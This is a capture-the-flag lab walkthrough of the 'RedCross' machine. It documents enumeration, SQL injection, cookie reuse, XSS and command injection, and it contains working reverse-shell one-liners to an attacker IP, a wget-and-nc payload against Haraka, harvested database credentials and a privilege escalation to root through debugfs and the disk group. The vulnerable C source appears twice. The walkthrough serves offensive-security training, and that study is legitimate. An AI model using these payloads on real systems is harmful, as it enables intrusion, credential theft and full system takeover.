A priori, none of the classic scans performed is working at all, so it's time to dig into nmap.
```
# Agressive scan (probably not the best idea to perform the first)
nmap -A -p- -Pn $(cat ip)

# Quick UDP enumeration
sudo nmap -p- --min-rate=1000 -vvv -T4 -sU -Pn $(cat ip)

# Default and safe scripts with UDP enabled
sudo nmap --script "default and safe" -T4 -sU -Pn $(cat ip)
```

Okay, let's first connect to the VPN and then let's enumerate ^^'.
```
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

After trying to connect to http server, we get redirected to `intra.redcross.htb`
 so let's add it to known hosts.

Ge can observe a login webpage and an interesting url. Let's try to perform some SQL injection to bypass the login. https://intra.redcross.htb/?page=login

There's also a contact webpage with a form that can be submitted with some fields.

We have some apache server with PHP. So let's perform some web discovery. Also I've to check why the response is not always the same for not found files.


# Loging form post
```
POST /pages/actions.php HTTP/1.1
Host: intra.redcross.htb
Cookie: PHPSESSID=0qfvrco1qfifj7f20ru0m99hd5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://intra.redcross.htb
Referer: https://intra.redcross.htb/?page=login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

user=AAAA&pass=BBBB&action=login
```

Also has a keep alive petition
```
GET / HTTP/1.1
Host: intra.redcross.htb
Cookie: PHPSESSID=0qfvrco1qfifj7f20ru0m99hd5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i
Te: trailers
Connection: keep-alive

```

# Contact form post 
```
POST /pages/actions.php HTTP/1.1
Host: intra.redcross.htb
Cookie: PHPSESSID=0qfvrco1qfifj7f20ru0m99hd5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://intra.redcross.htb
Referer: https://intra.redcross.htb/?page=contact
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

subject=AAAA&body=BBBB&cback=1111&action=contact
```


After some manual curl's I've noted that every thing is getting redirected to HTTPS trafic, so let's do some web discovery over the https port.

```
find $SECLIST/Discovery $FUZZDB/discovery -iname "*php*" | xargs -I % ffuf -u https://intra.redcross.htb/FUZZ -w % -fw 20 -s


find $SECLIST/Discovery $FUZZDB/discovery -iname "*php*" | xargs -I % ffuf -u https://intra.redcross.htb/?page=FUZZ -w % -fw 29 -s

```

Some found /?page=:
```
app
login
requests
contact
```

Some found over /:

```
init.php
index.php
javascript
```

https://intra.redcross.htb/init.php Is completely empty, let's curl it

After searching what the heck is init.php, it looks that may be related to `Bitrix Framework`
or `FacturaScripts` ?


It looks like we can also check for further file extensions by adding some additional options to ffuf (`-e`) or gobuster (`-x`). So let's try to find some interesting file extensions as well.

Now it's time to switch to FeroxBuster, the real web content discovery hehehe:
```
[####################] - 24s   180014/180014  0s      found:7       errors:162608
[####################] - 21s    30000/30000   1425/s  https://intra.redcross.htb/
[####################] - 18s    30000/30000   1659/s  https://intra.redcross.htb/images/
[####################] - 18s    30000/30000   1689/s  https://intra.redcross.htb/pages/
[####################] - 18s    30000/30000   1693/s  https://intra.redcross.htb/javascript/
[####################] - 17s    30000/30000   1803/s  https://intra.redcross.htb/documentation/
[####################] - 16s    30000/30000   1871/s  https://intra.redcross.htb/javascript/jquery/

```


```
feroxbuster -u https://intra.redcross.htb/pages -w $SECLIST/Discovery/Web-Content/raft-medium-files.txt -k --extensions pdf

403      GET        9l       28w      284c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      326c https://intra.redcross.htb/pages => https://intra.redcross.htb/pages/
200      GET        1l       29w      506c https://intra.redcross.htb/pages/login.php
200      GET        1l       18w      403c https://intra.redcross.htb/pages/contact.php
200      GET        1l       26w      463c https://intra.redcross.htb/pages/header.php
302      GET        0l        0w        0c https://intra.redcross.htb/pages/app.php => https://intra.redcross.htb/
200      GET        1l        4w       57c https://intra.redcross.htb/pages/bottom.php
302      GET        0l        0w        0c https://intra.redcross.htb/pages/actions.php => https://intra.redcross.htb/

```

Inspecting the certificate we have the first mail:
emailAddress = penelope@redcross.htb

Finally we download DirBuster and run it and find:
https://intra.redcross.htb:443/documentation/account-signup.pdf

After reading the pdf and following the instructions we receive the following credentials:
`guest:guest`


Allright, after login we get redirected to the app page. In there we can try to filter the users. So it's time to look for some injections:

```
${{<%[%'"}}%\

# returns

DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '}}%\') LIMIT 10' at line 1
```
So all right! We have an sql injection over the `o=` param in the app page.
`https://intra.redcross.htb/?o=<vuln>&page=app`

After playing with sqlmap, the follwoing tables are obtained:
```
[21:54:40] [INFO] retrieved: 'information_schema'
[21:54:41] [INFO] retrieved: 'redcross'

+----------+
| username |
+----------+
| admin    |
| charles  | -> cookiemonster 
| guest    |
| penelope | -> alexss
| tricia   |
+----------+

+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | 
| $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
| $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
| $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
| $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |
+--------------------------------------------------------------+


+----+------------------------------+--------+--------------------------------------------------------------+----------+
| id | mail                         | role   | password                                                     | username |
+----+------------------------------+--------+--------------------------------------------------------------+----------+
| 1  | admin@redcross.htb           | 0      | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | admin    |
| 2  | penelope@redcross.htb        | 1      | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | penelope |
| 3  | charles@redcross.htb         | 1      | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | charles  |
| 4  | tricia.wanderloo@contoso.com | 100    | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | tricia   |
| 5  | non@available                | 1000   | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | guest    |
+----+------------------------------+--------+--------------------------------------------------------------+----------+

```



We got cookiemonster as passwd for charles, and after loging to the webpage as charles, we can see that there is some message that "could you check the admin webpanel?" So we are missing some further panel.

After hashcating for a long while, I'm getting new credentials:
```
+----------+
| username |
+----------+
| admin    |
| charles  | -> cookiemonster 
| guest    |
| penelope | -> alexss
| tricia   |
+----------+

```

And loging as penelope, we find further messages in the portal:


As we saw in the messages, there must be an admin portal, so let's add admin.redcross.htb to kown hosts and try it! 

```
301      GET        9l       28w      327c https://admin.redcross.htb/images => https://admin.redcross.htb/images/
200      GET        1l       73w     1029c https://admin.redcross.htb/images/it.svg
302      GET        1l       18w      363c https://admin.redcross.htb/ => https://admin.redcross.htb/?page=login
302      GET        1l       18w      363c https://admin.redcross.htb/index.php => https://admin.redcross.htb/?page=login
301      GET        9l       28w      326c https://admin.redcross.htb/pages => https://admin.redcross.htb/pages/
200      GET        1l       16w      380c https://admin.redcross.htb/pages/login.php
302      GET        0l        0w        0c https://admin.redcross.htb/pages/users.php => https://admin.redcross.htb/
200      GET        1l       18w      363c https://admin.redcross.htb/pages/header.php
200      GET        1l        4w       52c https://admin.redcross.htb/pages/bottom.php
301      GET        9l       28w      331c https://admin.redcross.htb/javascript => https://admin.redcross.htb/javascript/
302      GET        0l        0w        0c https://admin.redcross.htb/pages/firewall.php => https://admin.redcross.htb/
[####################] - 55s  1051836/1051836 0s      found:11      errors:345180
[####################] - 50s   262950/262950  5240/s  https://admin.redcross.htb/
[####################] - 47s   262950/262950  5653/s  https://admin.redcross.htb/images/
[####################] - 43s   262950/262950  6078/s  https://admin.redcross.htb/pages/
[####################] - 39s   262950/262950  6657/s  https://admin.redcross.htb/javascript/ 

```

Finally, it looks like the key was to replace the cookie in admin web panel with the guest cookie of the intra domain:
`PHPSESSID=0odd3bi4qisdjneddjpjjs8fu4`

Then we observe that there is a firewall modifier and we can now grant access to our ip, so let's do it and re-scan the ports 
```
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 63
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
443/tcp  open  https      syn-ack ttl 63
1025/tcp open  NFS-or-IIS syn-ack ttl 63
5432/tcp open  postgresql syn-ack ttl 63
```

We now have an ftp and  a couple of more ports. Let's try the ftp server first.
```
DEBUG: All checks passed... Executing iptables Network access granted to 10.10.16.4 Network access granted to 10.10.16.4
```

It looks like there is no anonymous access over there. Let's try to acces the postgres database then:
```
psql -U charles -h $(cat ip) -p 5432   --list
```

Nothing interesting found on postgresql database port, let's go for 1025 one!

It looks like it may be related to SMTP service, so let's try some SMTP stuff:
```
nc -vn $(cat ip) 1025
```

We can also create users
```
guest : 8yh5jVIP
```

It's bullshit, it opens a very restricted shel.

Let's try XXS on the users page.
```
<script>alert(123)</script> 
```
And boom, it works.

```
<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//10.10.16.6:31415";d.body.appendChild(z)},0)>
```

## Lets get back to it

We co first into intra domain, use the guest user and captire the cookie to reutilise it on the admin portal. Then we are in and we can create a new user to inspect the exploitable script:
**admin : Cj3sxtSa**


Then we can connect to the new user via ssh and take a look to the script being executed over the network manager panel:

### The code
```
/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#define BUFFSIZE 360

int isValidIpAddress(char *ipAddress)
{
        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
        return result != 0;
}

int isValidAction(char *action){
        int a=0;
        char value[10];
        strncpy(value,action,9);
        if(strstr(value,"allow")) a=1;
        if(strstr(value,"restrict")) a=2;
        if(strstr(value,"show")) a=3;
        return a;
}

void cmdAR(char **a, char *action, char *ip){
        a[0]="/sbin/iptables";
        a[1]=action;
        a[2]="INPUT";
        a[3]="-p";
        a[4]="all";
        a[5]="-s";
        a[6]=ip;
        a[7]="-j";
        a[8]="ACCEPT";
        a[9]=NULL;
        return;
}

void cmdShow(char **a){
        a[0]="/sbin/iptables" ;
        a[1]="-L";
        a[2]="INPUT";
        return;
}

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");
        fgets(inputAction,BUFFSIZE,stdin);
        fflush(stdin);
        printf("IP address: ");
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;
}

int main(int argc, char *argv[]){
        int isAction=0;
        int isIPAddr=0;
        pid_t child_pid;
        char inputAction[10];
        char inputAddress[16];
        char *args[10];
        char buffer[200];

        if(argc!=3 && argc!=2){
                printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]);
                exit(0);
        }
        if(argc==2){
                if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]);
        }
        else{
                strcpy(inputAction, argv[1]);
                strcpy(inputAddress, argv[2]);
        }
        isAction=isValidAction(inputAction);
        isIPAddr=isValidIpAddress(inputAddress);
        if(!isAction || !isIPAddr){
                printf("Usage: %s allow|restrict|show IP\n", argv[0]);
                exit(0);
        }
        puts("DEBUG: All checks passed... Executing iptables");
        if(isAction==1) cmdAR(args,"-A",inputAddress);
        if(isAction==2) cmdAR(args,"-D",inputAddress);
        if(isAction==3) cmdShow(args);

        child_pid=fork();
        if(child_pid==0){
                setuid(0);
                execvp(args[0],args);
                exit(0);
        }
        else{
                if(isAction==1) printf("Network access granted to %s\n",inputAddress);
                if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
                if(isAction==3) puts("ERR: Function not available!\n");
        }
}
/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#define BUFFSIZE 360

int isValidIpAddress(char *ipAddress)
{
        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
        return result != 0;
}

int isValidAction(char *action){
        int a=0;
        char value[10];
        strncpy(value,action,9);
        if(strstr(value,"allow")) a=1;
        if(strstr(value,"restrict")) a=2;
        if(strstr(value,"show")) a=3;
        return a;
}

void cmdAR(char **a, char *action, char *ip){
        a[0]="/sbin/iptables";
        a[1]=action;
        a[2]="INPUT";
        a[3]="-p";
        a[4]="all";
        a[5]="-s";
        a[6]=ip;
        a[7]="-j";
        a[8]="ACCEPT";
        a[9]=NULL;
        return;
}

void cmdShow(char **a){
        a[0]="/sbin/iptables" ;
        a[1]="-L";
        a[2]="INPUT";
        return;
}

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");
        fgets(inputAction,BUFFSIZE,stdin);
        fflush(stdin);
        printf("IP address: ");
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;
}

int main(int argc, char *argv[]){
        int isAction=0;
        int isIPAddr=0;
        pid_t child_pid;
        char inputAction[10];
        char inputAddress[16];
        char *args[10];
        char buffer[200];

        if(argc!=3 && argc!=2){
                printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]);
                exit(0);
        }
        if(argc==2){
                if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]);
        }
        else{
                strcpy(inputAction, argv[1]);
                strcpy(inputAddress, argv[2]);
        }
        isAction=isValidAction(inputAction);
        isIPAddr=isValidIpAddress(inputAddress);
        if(!isAction || !isIPAddr){
                printf("Usage: %s allow|restrict|show IP\n", argv[0]);
                exit(0);
        }
        puts("DEBUG: All checks passed... Executing iptables");
        if(isAction==1) cmdAR(args,"-A",inputAddress);
        if(isAction==2) cmdAR(args,"-D",inputAddress);
        if(isAction==3) cmdShow(args);

        child_pid=fork();
        if(child_pid==0){
                setuid(0);
                execvp(args[0],args);
                exit(0);
        }
        else{
                if(isAction==1) printf("Network access granted to %s\n",inputAddress);
                if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
                if(isAction==3) puts("ERR: Function not available!\n");
        }
}

```

### Taking a look to the responses of the whitelist Ip Address output
`DEBUG: All checks passed... Executing iptables Network access granted to 10.10.16.2 Network access granted to 10.10.16.2`

We find out a way to obtain a reverse shell without parsing the `-e` option which may fail:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 31415 >/tmp/f
```

Finally after trying several payloads, the one that actually worked was a revshell using python:
```
export RHOST="10.10.16.6";export RPORT=31415;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
Url encoded to avoid issues
```
export%20RHOST%3D%2210%2E10%2E16%2E6%22%3Bexport%20RPORT%3D31415%3Bpython%20%2Dc%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22sh%22%29%27
```

After running linpeas, we find something interesting over passwd search:
```
$dbpass='SDofYmNYtc51';
$dbuser='phpmyadmin';
 
```

We try to find the service running and we have a firsttry hit:


```
$ service mysql status
* mariadb.service - MariaDB 10.3.39 database server
   Loaded: loaded (/lib/systemd/system/mariadb.service; enabled; vendor preset: enabled)
   Active: active (running) since Thu 2024-11-21 04:10:57 EST; 1h 27min ago
     Docs: man:mysqld(8)
           https://mariadb.com/kb/en/library/systemd/
  Process: 818 ExecStartPre=/usr/bin/install -m 755 -o mysql -g root -d /var/run/mysqld (code=exited, status=0/SUCCESS)
  Process: 829 ExecStartPre=/bin/sh -c systemctl unset-environment _WSREP_START_POSITION (code=exited, status=0/SUCCESS)
  Process: 840 ExecStartPre=/bin/sh -c [ ! -e /usr/bin/galera_recovery ] && VAR= ||   VAR=`cd /usr/bin/..; /usr/bin/galera_recovery`; [ $? -eq 0 ]   && systemctl set-environment _WSREP_START_POSITION=$VAR || exit 1 (code=exited, status=0/SUCCESS)
  Process: 995 ExecStartPost=/bin/sh -c systemctl unset-environment _WSREP_START_POSITION (code=exited, status=0/SUCCESS)
  Process: 998 ExecStartPost=/etc/mysql/debian-start (code=exited, status=0/SUCCESS)
 Main PID: 919 (mysqld)
   Status: "Taking your SQL requests now..."
    Tasks: 35 (limit: 1136)
   Memory: 89.0M
   CGroup: /system.slice/mariadb.service
           `-919 /usr/sbin/mysqld

$ mysql -h 127.0.0.1 -u phpmyadmin -p

```

Inside mysql
```
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| phpmyadmin         |
+--------------------+
2 rows in set (0.019 sec)



# As many tables are empty, let's take a look to non-empty tables:

SELECT table_type,
       table_name
FROM information_schema.tables
WHERE table_rows >= 1;

pma__userconfig

selct * from pma__userconfig;

+------------+---------------------+-----------------------------------------------+
| username   | timevalue           | config_data                                   |
+------------+---------------------+-----------------------------------------------+
| phpmyadmin | 2018-06-03 17:46:51 | {"collation_connection":"utf8mb4_unicode_ci"} |
| root       | 2018-06-03 18:04:02 | {"collation_connection":"utf8mb4_unicode_ci"} |
+------------+---------------------+-----------------------------------------------+
```
As we have seen previously a file where the cookies were created, we can directly check if the data we have just found is related to the cookies:

```
cd /var/www/html/admin/9a7d3e2c3ffb452b2e40784f77723938
cat 573ba8e9bfd0abd3d69d8395db582a9e.php

sql=$mysqli->prepare("SELECT id, mail, role FROM users WHERE username = ?");
$sql->bind_param("s", $user);
$sql->execute();
$sql->store_result();
$sql->bind_result($id,$mail,$role);
$sql->fetch();

$_SESSION['auth']=1;
$_SESSION['userid']=$id;
$_SESSION['mail']=$mail;
$_SESSION['role']=$role;
$_SESSION['username']=$user;
$cname="LANG";
$cvalue="EN_US";
$ctime=time()+(86400*90);
setcookie($cname,$cvalue,$ctime,"/");
$cname="SINCE";
$cvalue=time();
$ctime=time()+(86400*90);
setcookie($cname,$cvalue,$ctime,"/");
$cname="LIMIT";
$cvalue="10";
$ctime=time()+(86400*90);
setcookie($cname,$cvalue,$ctime,"/");
$cname="DOMAIN";
$cvalue="admin";
$ctime=time()+(86400*90);
setcookie($cname,$cvalue,$ctime,"/");

/*block code to get and show the XSS*/
$xss=$_GET['x'];
echo $xss;
/*end block*/
?>

# Not really indeed
```
Then let's take a look to the files in admin panel:

```
cat users.php

 $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
```

And Boom! another DB, this time a postgres db with some db user and pass:

```
psql -U unixnss -h 127.0.0.1 -d unix

   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileg
es
-----------+----------+----------+-------------+-------------+------------------
-----
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 redcross  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =Tc/postgres
    +
           |          |          |             |             | postgres=CTc/post
gres+
           |          |          |             |             | www=CTc/postgres
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
    +
           |          |          |             |             | postgres=CTc/post
gres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
    +
           |          |          |             |             | postgres=CTc/post
gres
 unix      | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |

```

Let's take back a look to the users.php file since there we have the key of where the interesting data is hosted:
```
<?php
if(isset($_SESSION['auth']) and $_SESSION['auth']===1){
        echo "<center>";
        echo "<form method=POST action='/pages/actions.php'>Add virtual user:<input type='text' name='username'>&nbsp<input type='submit' name='action' value='adduser'></form>";
        echo "</center>";

        $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
        $result = pg_prepare($dbconn, "q1", "SELECT * FROM passwd_table WHERE gid = 1001");
        $result = pg_execute($dbconn, "q1", array());
        if(pg_num_rows($result)>0){
                echo "<center align=center><table cellspacing=5 cellpadding=5><tr><td>Username</td><td>UID</td><td>GID</td><td>Action</td></tr>";
                while($line=pg_fetch_array($result, null, PGSQL_ASSOC)){
                        echo "<tr><td>".$line['username']."</td><td>".$line['uid']."</td><td>".$line['gid']."</td>";
                        echo "<td><form action='/pages/actions.php' method=POST><input type=hidden name=uid value=".$line['uid'].">";
                        echo "<input type=submit name=action value=del></form></td></tr>";
                }
                echo "</table></center>";
        }

} else {
        header('Location: /');
        exit;
}
```

```
SELECT * FROM passwd_table;
WARNING: terminal is not fully functional
-  (press RETURN) username |               passwd               | uid  | gid  | gecos |    homedi
r     |   shell
----------+------------------------------------+------+------+-------+----------
------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail
/home | /bin/bash
 admin    | $1$3hjoBZc3$oU7XZwHqVopMa7i7IEvs6/ | 2020 | 1001 |       | /var/jail
/home | /bin/bash
(2 rows)

```


We have a hash that looks like a md5crypt hash so let's hashcat it!
```
 hashcat -h | grep -i md5crypt
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)    | Operating System

```

Hey my bro, there are further credentials over init.php in the intra domain!:
```
#database configuration
$dbhost='127.0.0.1';
$dbuser='dbcross';
$dbpass='LOSPxnme4f5pH5wp';
$dbname='redcross';


# from actions.php
SELECT id, password, mail, role FROM users WHERE username = ?"
```

Forget about previous hashes, we have the goodones now!

```
select * from users;

+----+----------+--------------------------------------------------------------+------------------------------+------+
| id | username | password                                                     | mail                         | role |
+----+----------+--------------------------------------------------------------+------------------------------+------+
|  1 | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | admin@redcross.htb           |    0 |
|  2 | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | penelope@redcross.htb        |    1 |
|  3 | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | charles@redcross.htb         |    1 |
|  4 | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | tricia.wanderloo@contoso.com |  100 |
|  5 | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | non@available                | 1000 |
+----+----------+--------------------------------------------------------------+------------------------------+------+
```


```
penelope -> alexss

```


Finally we got into the same point we were previously hahaha
Let's dig into the 1025 port then.

It could be a service running on 25 port but shifted due to the lack of permisions.

We try to connect from the reverse shell we have and the server does respond:
```
 telnet 127.0.0.1 1025
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 redcross ESMTP Haraka 2.8.8 ready
```


As we have found, haraka is completely vulnerable. After several tries of printing the id or the whoami output to the filesystem itself, it looks like we can not access it, so let's try to download a nc and execute a reverse shell in the command: 
```
cd /tmp; rm nc; wget http://10.10.16.6:81/nc ;chmod 777 ./nc; ./nc 10.10.16.6 1415 -e /bin/bash
```

Once we are in, we start searching for sensitive data:
```
penelope@redcross:/var/www/html$ grep -Irin . -e "pass"
./admin/init.php:5:$dbpass='LOSPxnme4f5pH5wp';
./admin/9a7d3e2c3ffb452b2e40784f77723938/573ba8e9bfd0abd3d69d8395db582a9e.php:6:$mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./admin/pages/cpanel.php:4:     $mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./admin/pages/login.php:7:echo "<tr><td align='right'>Password</td><td><input type='password' name='pass'></input></td></tr>";
./admin/pages/firewall.php:7:   $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
./admin/pages/users.php:7:      $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
./admin/pages/users.php:8:      $result = pg_prepare($dbconn, "q1", "SELECT * FROM passwd_table WHERE gid = 1001");
./admin/pages/actions.php:21:   if(!isset($_POST['pass']) and !isset($_POST['user'])){
./admin/pages/actions.php:28:   $pass=$_POST['pass'];
./admin/pages/actions.php:31:   $mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./admin/pages/actions.php:32:   $sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
./admin/pages/actions.php:44:   if(password_verify($pass,$hash) and $role==0){
./admin/pages/actions.php:66:   } else if(password_verify($pass,$hash)){
./admin/pages/actions.php:95:   $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
./admin/pages/actions.php:109:  $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
./admin/pages/actions.php:116:  $passw=generateRandomString();
./admin/pages/actions.php:117:  $phash=crypt($passw);
./admin/pages/actions.php:118:  $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
./admin/pages/actions.php:119:  $result = pg_prepare($dbconn, "q1", "insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");
./admin/pages/actions.php:122:  echo "<b>$username : $passw</b><br><br><a href=/?page=users>Continue</a>";
./admin/pages/actions.php:127:  $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
./admin/pages/actions.php:128:  $result = pg_prepare($dbconn, "q1", "delete from passwd_table where uid = $1");
./intra/init.php:5:$dbpass='LOSPxnme4f5pH5wp';
./intra/pages/login.php:7:echo "<tr><td align='right'>Password</td><td><input type='password' name='pass'></input></td></tr>";
./intra/pages/actions.php:16:   if(!isset($_POST['pass']) and !isset($_POST['user'])){
./intra/pages/actions.php:23:   $pass=$_POST['pass'];
./intra/pages/actions.php:26:   $mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./intra/pages/actions.php:27:   $sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
./intra/pages/actions.php:39:   if(password_verify($pass,$hash)){
./intra/pages/actions.php:95:           $mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./intra/pages/app.php:4:        $mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./intra/pages/app.php:22:       $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
./intra/pages/app.php:33:               $mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);

```

We find some unexplored db:
```
"host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&



INSERT INTO passwd_table (username, passwd, uid, gid, homedir, shell)

```


**test : LJvin5d6**

We can now modify the gid to add all the created users to disk group, which is quite exploitable.
To do so we connect to postgresql and run the following query
```
update passwd_table set gid=6 where gid=1001
```

Then we can log into the new user test from the penelope reverse shell to debug the filesystem and gain root access:
```
su test

df -h # shows the fs device

debugfs /dev/sda1
debugfs: cat /root/root.txt

c0644...
```